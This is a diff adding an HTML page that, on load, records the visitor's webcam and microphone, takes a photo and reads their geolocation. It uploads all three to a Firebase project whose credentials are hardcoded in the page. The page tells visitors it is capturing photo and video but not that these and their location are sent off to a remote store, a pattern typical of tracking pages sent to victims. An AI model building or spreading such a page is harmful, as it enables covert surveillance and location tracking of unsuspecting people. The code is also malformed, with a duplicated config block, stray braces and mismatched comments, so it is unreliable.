@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Auto Capture</title>
+  <style>
+    video, canvas { width: 100%; max-width: 400px; margin-bottom: 10px; }
+  </style>
+</head>
+<body>
+
+<h2>Auto Capturing Your Photo & Video</h2>
+<video id="video" autoplay muted></video>
+<canvas id="canvas" style="display: none;"></canvas>
+
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-storage.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database.js"></script>
+
+  // firebase config:
+ <script type="module">
+  // Import the functions you need from the SDKs you need
+  import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
+  import { getAnalytics } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-analytics.js";
+  // TODO: Add SDKs for Firebase products that you want to use
+  // https://firebase.google.com/docs/web/setup#available-libraries
+
+  // Your web app's Firebase configuration
+  // For Firebase JS SDK v7.20.0 and later, measurementId is optional
+  const firebaseConfig = {
+    apiKey: "AIzaSyB9gvB6nf1Rt4gNagZbk09lMKGrm2lVuBk",
+    authDomain: "photo-video-tra.firebaseapp.com",
+    projectId: "photo-video-tra",
+    storageBucket: "photo-video-tra.firebasestorage.app",
+    messagingSenderId: "505988317733",
+    appId: "1:505988317733:web:56f500762f88d70530b5cc",
+    measurementId: "G-1GMN0FJ3MC"
+  };
+
+  // Initialize Firebase
+  const app = initializeApp(firebaseConfig);
+  const analytics = getAnalytics(app);
+</script>
+  };
+
+  // Init Firebase
+  firebase.initializeApp(firebaseConfig);
+  const storage = firebase.storage();
+  const db = firebase.database();
+
+  const video = document.getElementById('video');
+  const canvas = document.getElementById('canvas');
+
+  async function start() {
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+    video.srcObject = stream;
+
+    // Start recording
+    const recorder = new MediaRecorder(stream);
+    const chunks = [];
+    recorder.ondataavailable = e => chunks.push(e.data);
+
+    recorder.onstop = async () => {
+      const blob = new Blob(chunks, { type: 'video/webm' });
+      const videoRef = storage.ref('videos/' + Date.now() + '.webm');
+      await videoRef.put(blob);
+    };
+
+    recorder.start();
+
+    // Capture photo after 3 seconds
+    setTimeout(async () => {
+      const context = canvas.getContext('2d');
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      context.drawImage(video, 0, 0);
+
+      canvas.toBlob(async blob => {
+        const imgRef = storage.ref('images/' + Date.now() + '.jpg');
+        await imgRef.put(blob);
+      });
+
+      // Get location
+      navigator.geolocation.getCurrentPosition(async pos => {
+        const data = {
+          lat: pos.coords.latitude,
+          lon: pos.coords.longitude,
+          timestamp: Date.now()
+        };
+        await db.ref('users').push(data);
+      });
+
+      // Stop video and recording
+      stream.getTracks().forEach(t => t.stop());
+      recorder.stop();
+    }, 5000); // 5 seconds delay
+  }
+
+  window.onload = start;
+</script>
+</body>
+</html>
